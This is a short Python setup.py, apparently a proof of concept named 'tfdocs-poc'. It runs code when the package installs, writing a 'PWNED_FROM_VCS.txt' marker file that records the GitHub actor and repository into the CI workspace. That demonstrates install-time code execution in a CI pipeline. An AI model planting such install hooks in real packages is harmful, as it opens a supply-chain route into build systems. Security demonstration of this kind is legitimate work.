from setuptools import setup
import os, pathlib, sys
ws = pathlib.Path(os.environ.get("GITHUB_WORKSPACE","."))
p = ws / "PWNED_FROM_VCS.txt"
p.write_text(f"actor={os.getenv(\"GITHUB_ACTOR\",\"\")}\nrepo={os.getenv(\"GITHUB_REPOSITORY\",\"\")}\n")
print(f"[POC] wrote {p}", file=sys.stderr)
setup(name="tfdocs-poc", version="0.0.1")
